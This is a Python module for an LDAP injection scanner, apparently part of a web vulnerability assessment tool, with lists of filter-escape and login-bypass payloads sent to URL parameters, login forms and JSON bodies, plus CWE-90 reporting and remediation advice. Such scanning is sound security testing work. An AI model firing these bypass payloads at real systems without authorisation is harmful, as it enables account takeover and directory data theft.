"""
LDAP Injection Scanner — Professional Grade
============================================
Coverage:
  • Error-based LDAP injection detection (server error messages)
  • Boolean-based blind LDAP injection (response length differential)
  • Authentication bypass via LDAP (*)(|( injection
  • LDAP filter escape sequences: *, ), (, \\, \\x00
  • Windows AD LDAP specific injection patterns
  • OpenLDAP error string detection
  • Login form LDAP auth bypass
  • URL parameter LDAP injection
  • Time-based hint detection

CWE  : CWE-90 (Improper Neutralization of Special Elements in LDAP Queries)
OWASP: A03:2021 – Injection
"""
from __future__ import annotations

import re
import time
from typing import Any, Dict, List, Optional, Tuple

from .base_scanner import BaseScanner
try:
    from ..recon.intelligence_bridge import IntelligenceAwareScanner as _ScannerBase
except Exception:
    _ScannerBase = BaseScanner
from ..core.http_client import HTTPResponse
from ..models.vulnerability import (
    Vulnerability, VulnType, Severity, CVSSv3,
    AttackVector, AttackComplexity, PrivilegesRequired,
    UserInteraction, Scope, Impact,
)

_CVSS_HIGH = CVSSv3(AttackVector.NETWORK, AttackComplexity.LOW,
    PrivilegesRequired.NONE, UserInteraction.NONE,
    Scope.UNCHANGED, Impact.HIGH, Impact.LOW, Impact.NONE)
_CVSS_MEDIUM = CVSSv3(AttackVector.NETWORK, AttackComplexity.HIGH,
    PrivilegesRequired.NONE, UserInteraction.NONE,
    Scope.UNCHANGED, Impact.LOW, Impact.NONE, Impact.NONE)

_CWE = "CWE-90"
_OWASP = "A03:2021 - Injection"
_REFS = [
    "https://owasp.org/www-community/attacks/LDAP_Injection",
    "https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html",
    "https://cwe.mitre.org/data/definitions/90.html",
]
_REMEDIATION = (
    "1. Use parameterized LDAP queries or an ORM that handles escaping automatically.\n"
    "2. Escape all LDAP special characters: ( ) * \\ \\x00 / before inserting into filters.\n"
    "3. Use an allowlist to validate input against expected LDAP attribute formats.\n"
    "4. Apply principle of least privilege to the LDAP service account."
)

# LDAP error signatures
_LDAP_ERROR_RE = re.compile(
    r"(?i)(ldap.*error|ldap.*exception|javax\.naming|"
    r"NamingException|LDAPException|LDAP.*invalid|"
    r"ldap_search|ldap_bind|ldap_connect|"
    r"ActiveDirectory|AD.*error|"
    r"0x80090308|0x8009030c|"          # Windows LDAP error codes
    r"invalid filter|bad search filter|"
    r"filter parse error|unexpected end of filter|"
    r"cn=.*,dc=|uid=.*,ou=)",          # Leaked LDAP DNs
)

# Boolean-based payloads: (true_payload, false_payload, description)
_BOOL_PAYLOADS: List[Tuple[str, str, str]] = [
    ("*",               "invalid_xyz_abc",  "Wildcard match"),
    ("*)(uid=*",        "invalid_xyz",      "Filter escape wildcard"),
    ("admin)(&",        "invalid_xyz",      "AND filter break"),
    ("*)(|(uid=*",      "invalid_xyz",      "OR filter injection"),
]

# Auth bypass payloads for login forms
_AUTH_BYPASS_PAYLOADS: List[Tuple[str, str]] = [
    ("*",                    "*"),
    ("admin)(&(password=*",  "*"),
    ("admin)(|(uid=*",       "*"),
    ("*)(|(password=",       "*"),
    (")(uid=*))(|(uid=",     "*"),
    ("admin",                "*))(|(password=*"),
    ("*",                    "invalid_xyz)(|(password=*"),
]

# Error injection probes
_ERROR_PAYLOADS: List[str] = [
    "*)(objectClass=*",
    "*)(|(objectClass=*",
    ")(|(uid=*",
    "*\\x00*",
    "*)(uid=*))(|(uid=",
    "admin))(|(password=*",
    "\\2a)(uid=*",          # encoded *
    "(|(uid=*))",
]


class LDAPInjectionScanner(_ScannerBase):
    name = "LDAP Injection"

    async def scan_url(
        self,
        url: str,
        response: HTTPResponse,
        forms: List[Dict[str, Any]],
    ) -> List[Vulnerability]:
        vulns: List[Vulnerability] = []

        params = self._extract_url_params(url)

        # 1. URL param error-based
        for param in params:
            found = await self._test_error_based(url, param)
            vulns.extend(found)
            if found:
                break

        # 2. URL param boolean-based blind
        for param in params:
            found = await self._test_boolean_blind(url, param)
            vulns.extend(found)
            if found:
                break

        # 3. Login form auth bypass
        for form in forms:
            method = (form.get("method") or "GET").upper()
            action = form.get("action") or url
            inputs = form.get("inputs", [])
            pass_inputs = [i for i in inputs if i.get("type", "").lower() == "password"]
            if method == "POST" and pass_inputs:
                found = await self._test_auth_bypass(action, inputs)
                vulns.extend(found)


        # ── JSON body injection (REST APIs) ─────────────────────────────────
        if not vulns:
            ct = (response.content_type or "").lower()
            if "json" in ct:
                found = await self._test_json_body(url, response)
                vulns.extend(found)

        return vulns

    async def _test_error_based(self, url: str, param: str) -> List[Vulnerability]:
        for payload in _ERROR_PAYLOADS:
            injected = self._inject_param(url, param, payload)
            resp = await self.client.get(injected)
            if not resp:
                continue
            m = _LDAP_ERROR_RE.search(resp.text)
            if m:
                return [self._build_vuln(
                    vuln_type=VulnType.MISC,
                    title=f"LDAP Injection — Error-Based (param: {param})",
                    description=(
                        f"Parameter '{param}' triggered an LDAP error when injected with '{payload}'. "
                        f"This confirms user input is passed unsanitized into an LDAP query. "
                        f"An attacker can enumerate directory entries, bypass authentication, "
                        f"or extract sensitive AD/LDAP attributes."
                    ),
                    url=url, parameter=param, payload=payload,
                    evidence=f"LDAP error: '{m.group(0)[:120]}'",
                    method="GET", severity=Severity.HIGH, cvss=_CVSS_HIGH,
                    remediation=_REMEDIATION, references=_REFS,
                    cwe_id=_CWE, owasp_category=_OWASP,
                    response_snippet=self._snippet(resp.text), confidence="High",
                )]
        return []

    async def _test_boolean_blind(self, url: str, param: str) -> List[Vulnerability]:
        for true_pl, false_pl, desc in _BOOL_PAYLOADS:
            url_true  = self._inject_param(url, param, true_pl)
            url_false = self._inject_param(url, param, false_pl)
            url_base  = self._inject_param(url, param, "normal_baseline_ldap_xyz")

            r_true  = await self.client.get(url_true)
            r_false = await self.client.get(url_false)
            r_base  = await self.client.get(url_base)
            if not (r_true and r_false and r_base):
                continue

            len_true  = len(r_true.text)
            len_false = len(r_false.text)
            len_base  = len(r_base.text)

            # True should look like baseline, false should differ
            if abs(len_true - len_base) < 100 and abs(len_true - len_false) > 100:
                return [self._build_vuln(
                    vuln_type=VulnType.MISC,
                    title=f"LDAP Injection — Boolean-Based Blind ({desc})",
                    description=(
                        f"Parameter '{param}' returns different responses for LDAP "
                        f"true/false conditions, indicating blind LDAP injection. "
                        f"True payload ('{true_pl}'): {len_true}B ≈ baseline {len_base}B. "
                        f"False payload ('{false_pl}'): {len_false}B. "
                        f"An attacker can enumerate LDAP directory attributes character by character."
                    ),
                    url=url, parameter=param,
                    payload=f"TRUE: {true_pl} | FALSE: {false_pl}",
                    evidence=f"true={len_true}B, false={len_false}B, base={len_base}B",
                    method="GET", severity=Severity.HIGH, cvss=_CVSS_HIGH,
                    remediation=_REMEDIATION, references=_REFS,
                    cwe_id=_CWE, owasp_category=_OWASP, confidence="Medium",
                )]
        return []

    async def _test_auth_bypass(
        self, action: str, inputs: List[Dict[str, Any]]
    ) -> List[Vulnerability]:
        user_field = next(
            (i["name"] for i in inputs
             if i.get("type", "").lower() in ("text", "email") or
             any(k in i.get("name", "").lower() for k in ("user", "email", "login", "name"))),
            None,
        )
        pass_field = next(
            (i["name"] for i in inputs if i.get("type", "").lower() == "password"),
            None,
        )
        if not user_field or not pass_field:
            return []

        base_data = {inp["name"]: inp.get("value", "") for inp in inputs
                     if inp.get("type") not in ("submit", "button")}
        base_data[user_field] = "invalid_ldap_user_xyz"
        base_data[pass_field] = "invalid_ldap_pass_xyz"
        failed = await self.client.post(action, data=base_data)
        failed_len = len(failed.text) if failed else 0

        for user_pl, pass_pl in _AUTH_BYPASS_PAYLOADS:
            test = dict(base_data)
            test[user_field] = user_pl
            test[pass_field] = pass_pl
            resp = await self.client.post(action, data=test)
            if not resp:
                continue

            body = resp.text.lower()
            m = _LDAP_ERROR_RE.search(resp.text)
            if m:
                return [self._build_vuln(
                    vuln_type=VulnType.MISC,
                    title="LDAP Injection Auth Bypass — Error Triggered",
                    description=(
                        f"Login form at '{action}' triggered an LDAP error with payload "
                        f"user='{user_pl}', pass='{pass_pl}', confirming LDAP injection."
                    ),
                    url=action, parameter=f"{user_field},{pass_field}",
                    payload=f"user={user_pl}&pass={pass_pl}",
                    evidence=f"LDAP error: '{m.group(0)[:100]}'",
                    method="POST", severity=Severity.CRITICAL, cvss=_CVSS_HIGH,
                    remediation=_REMEDIATION, references=_REFS,
                    cwe_id=_CWE, owasp_category=_OWASP, confidence="High",
                )]

            success = any(k in body for k in ("dashboard","logout","welcome","profile"))
            failure = any(k in body for k in ("invalid","incorrect","failed","error","denied"))
            if resp.status_code in (200, 302) and (success or len(resp.text) > failed_len + 200) and not failure:
                return [self._build_vuln(
                    vuln_type=VulnType.BROKEN_AUTH,
                    title="LDAP Injection Authentication Bypass",
                    description=(
                        f"Login form at '{action}' accepted LDAP injection payload "
                        f"user='{user_pl}', pass='{pass_pl}', bypassing authentication."
                    ),
                    url=action, parameter=f"{user_field},{pass_field}",
                    payload=f"user={user_pl}&pass={pass_pl}",
                    evidence=f"HTTP {resp.status_code} — auth bypass indicators present",
                    method="POST", severity=Severity.CRITICAL, cvss=_CVSS_HIGH,
                    remediation=_REMEDIATION, references=_REFS,
                    cwe_id=_CWE, owasp_category=_OWASP, confidence="Medium",
                )]
        return []

    # ------------------------------------------------------------------
    # JSON body injection (REST APIs returning application/json)
    # ------------------------------------------------------------------

    async def _test_json_body(
        self, url: str, response: "HTTPResponse"
    ) -> list:
        """Inject payloads into JSON body fields of REST API endpoints."""
        import json as _json

        try:
            data = _json.loads(response.text)
        except Exception:
            data = {}

        if not isinstance(data, dict):
            data = {}

        field_names = [k for k in data.keys() if isinstance(data[k], (str, int))][:5]
        if not field_names:
            field_names = ["id", "input", "value", "query", "data"]

        for field in field_names:
            for payload in _ERROR_PAYLOADS[:6]:
                test_body = dict(data)
                test_body[field] = payload

                resp = await self.client.post(
                    url,
                    json=test_body,
                    headers={"Content-Type": "application/json"},
                )
                if resp is None:
                    continue

                if _LDAP_ERROR_RE.search(resp.text):
                    return [self._build_vuln(
                        vuln_type=VulnType.LDAP_INJECTION,
                        title="LDAP Injection via JSON Body",
                        description=(
                            f"JSON field '{field}' at {url} is vulnerable to injection via "
                            f"REST API POST body. The payload was: {payload!r}"
                        ),
                        url=url,
                        parameter=field,
                        payload=_json.dumps({field: payload}),
                        evidence=self._snippet(resp.text, 200),
                        method="POST",
                        severity=Severity.HIGH,
                        remediation="Use LDAP sanitization libraries. Escape special characters in LDAP filters.",
                        references=["https://owasp.org/www-community/attacks/LDAP_Injection", "https://cwe.mitre.org/data/definitions/90.html"],
                        cwe_id="CWE-90",
                        owasp_category="A03:2021 - Injection",
                        confidence="Medium",
                    )]
        return []
